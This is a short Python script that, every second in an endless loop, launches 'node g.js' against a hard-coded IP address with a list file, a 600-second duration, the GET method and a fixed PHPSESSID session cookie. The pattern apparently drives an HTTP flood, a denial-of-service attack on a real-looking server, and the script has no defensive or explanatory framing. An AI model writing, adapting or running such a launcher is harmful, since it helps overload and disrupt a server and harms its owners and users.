import schedule
import time
import os
import sys

os.system('node g.js https://151.106.123.117 all.txt 600 GET PHPSESSID:fnt6bi6h9qubbt1toh9loc2j34')

def job():
    os.system('node g.js https://151.106.123.117 all.txt 600 GET PHPSESSID:fnt6bi6h9qubbt1toh9loc2j34')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)